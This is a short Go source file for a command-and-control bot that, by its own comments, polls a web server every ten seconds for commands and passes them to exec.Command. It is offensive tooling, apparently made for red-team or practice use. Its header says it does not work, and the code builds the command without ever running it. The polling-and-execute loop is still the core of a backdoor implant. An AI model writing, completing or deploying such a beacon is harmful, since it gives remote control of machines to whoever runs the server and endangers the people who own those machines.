// Golang bot to pull commands from webserver and execute them
// Disclaimer: This doesn't work
// @author: degenerat3

package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"time"
)

var serv = "127.0.0.1:5000" //IP of flask serv
var src = "GoBin"           // where is this calling back from
//var loopTime = 10000        //sleep time in millisecs

// get hostname and return it as a string
func getHn() string {
	hn, _ := os.Hostname()
	return hn
}

// get IP address of outbound connection
func getIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80") // create a garbage connection
	defer conn.Close()
	ad := conn.LocalAddr().(*net.UDPAddr) // get the ip from that conn
	ipStr := ad.IP.String()               // convert the ip to a string
	return ipStr
}

// query the server and execute the received commands
func getCommands() {
	ip := getIP()
	url := "http://" + serv + "/api/callback/" + ip + "/go"
	r, err := http.Get(url) // get the commands
	if err != nil {
		panic(err)
	}
	defer r.Body.Close()
	txt, err := ioutil.ReadAll(r.Body)
	if err != nil {
		panic(err)
	}
	fmt.Printf("commands: \n%s\n", txt)
	exec.Command(string(txt)) // run em
}

func main() {
	for {
		getCommands()
		time.Sleep(10000 * time.Millisecond)
	}

}
